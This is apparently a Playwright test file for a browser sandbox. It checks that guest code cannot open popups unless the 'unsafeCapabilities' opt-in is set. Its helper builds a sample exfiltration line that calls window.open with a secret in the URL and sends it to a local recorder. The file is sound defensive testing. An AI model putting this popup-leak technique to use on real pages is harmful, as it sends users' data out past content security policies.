import { test, expect } from '../../../test/e2e/fixture';
import { useRecorder } from '../../../test/e2e/recorder';

/**
 * Research 13: popup exfiltration (backlog S12, issue #6 N3).
 * A popup is a new top-level window: neither the guest's CSP nor the wrapper's frame-src applies to it.
 *
 * Evidence (backlog T5): the guest's own outcome of window.open, the browser context's page count, and a
 * listener outside the browser that the popup targets. 13.2 is the positive control for both: the same
 * call with the opt-in opens a page and reaches the listener.
 */

const recorder = useRecorder();
// Firefox throws when popups are not allowed; the other engines return null
const openPopup = (target: string) => `let r; try { r = window.open('${target}/?leak=guest-secret') ? 'opened' : 'refused'; } catch (e) { r = 'refused'; } console.log('POPUP ' + r);`;

test('13.1 allow-popups passed as a regular capability is dropped, so no popup leaves', async ({ sandbox, context, page }) => {
    let popups = 0;
    context.on('page', () => popups++);
    const warnings: string[] = [];
    page.on('console', m => { if (m.type() === 'warning') warnings.push(m.text()); });

    await sandbox.mount({ capabilities: ['allow-scripts', 'allow-popups' as any] });
    await sandbox.run(openPopup(recorder.blocked));

    expect(await sandbox.waitForLog('POPUP ')).toBe('POPUP refused');
    await page.waitForTimeout(1000);
    expect(popups).toBe(0);
    expect(recorder.paths('blocked')).toEqual([]);
    expect(warnings.join('\n')).toContain('"allow-popups" is not allowed in "capabilities"');
});

test('13.2 the explicit unsafeCapabilities opt-in still allows popups — and warns', async ({ sandbox, context, page }) => {
    let popups = 0;
    context.on('page', () => popups++);
    const warnings: string[] = [];
    page.on('console', m => { if (m.type() === 'warning') warnings.push(m.text()); });

    await sandbox.mount({ unsafeCapabilities: ['allow-popups'] });
    await sandbox.run(openPopup(recorder.blocked));

    // Documents the accepted risk of the opt-in: the URL is the exfiltration channel.
    expect(await sandbox.waitForLog('POPUP ')).toBe('POPUP opened');
    await recorder.waitFor('blocked', '/?leak=guest-secret');
    await expect.poll(() => popups).toBe(1);
    expect(warnings.join('\n')).toContain('unsafe capability "allow-popups" is enabled');
});
